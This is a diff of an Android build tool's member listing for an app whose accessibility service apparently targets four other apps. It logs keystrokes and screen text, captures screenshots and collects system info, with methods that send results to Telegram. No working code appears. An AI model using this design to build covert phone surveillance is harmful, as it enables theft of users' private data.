@@ -9862,8 +9862,6 @@ com.MainActivity:
     private static final java.lang.String CHANNEL_ID
 com.MyAccessibilityService$MessageSender:
     private static final java.lang.String TAG
-com.MyAccessibilityService$ScreenshotSender:
-    private static final java.lang.String TAG
 com.MyAccessibilityService:
     private static final long EXPIRATION_TIME
     private static final int MAX_BUFFER_SIZE
@@ -9872,6 +9870,7 @@ com.MyAccessibilityService:
     private static final java.lang.String TARGET_APP_PACKAGE2
     private static final java.lang.String TARGET_APP_PACKAGE3
     private static final java.lang.String TARGET_APP_PACKAGE4
+    private void sendErrorToTelegram(java.lang.String)
 com.getkeepsafe.relinker.ApkLibraryInstaller:
     private static final int COPY_BUFFER_SIZE
     private static final int MAX_TRIES
@@ -29858,8 +29857,6 @@ com.MainActivity:
     public static void showToastPeriodically()
 com.MyAccessibilityService$MessageSender:
     public static varargs java.lang.Void doInBackground()
-    public static varargs java.lang.Void doInBackground$1()
-com.MyAccessibilityService$ScreenshotSender
 com.MyAccessibilityService:
     public android.media.ImageReader imageReader
     public android.media.projection.MediaProjection mediaProjection
@@ -29867,6 +29864,7 @@ com.MyAccessibilityService:
     public int screenDensity
     public android.hardware.display.VirtualDisplay virtualDisplay
     public static int countKeyEvents()
+    public static java.lang.String formatScreenText()
     public static java.lang.String getCurrentTimestamp()
     public static java.lang.String getSYSInfo()
     public static void handleNotificationChangedEvent()
@@ -29874,7 +29872,6 @@ com.MyAccessibilityService:
     public static void handleTypeViewEvent()
     public static void initScreenshot()
     public static void logAllTexts()
-    public static void sendScreenshotToTelegram()
 com.getkeepsafe.relinker.ApkLibraryInstaller$ZipFileInZipEntry
 com.getkeepsafe.relinker.ApkLibraryInstaller
 com.getkeepsafe.relinker.ReLinker$LibraryInstaller
